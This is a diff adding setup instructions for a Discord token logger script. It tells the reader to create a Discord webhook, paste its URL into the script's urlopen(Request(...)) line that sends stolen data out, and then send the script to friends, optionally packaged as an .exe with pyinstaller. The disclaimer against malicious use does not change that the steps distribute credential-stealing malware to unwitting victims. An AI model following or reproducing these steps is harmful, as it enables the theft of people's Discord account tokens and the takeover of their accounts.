@@ -1,0 +1,9 @@
+1. Make a new discord server and go to any channel ( this will be the one the info is sent to ) 
+
+2. Create a new webhook
+
+3. Copy webhook url
+
+4. Open the TokenLogger.py file with notepad/visual studio code and scroll down to the bottom of the code until you find the part that says urlopen(Request("PASTE WEBHOOK HERE", data=dumps(webhook).encode(), headers=getheaders())) and change the PAST WEBHOOK HERE to the copied url
+
+5. Send to your friends ( DONT USE THIS MALICIOUSLY ) as a troll to log in or something like that. They will need to have Python installed or convert the .py to a .exe using pyinstaller
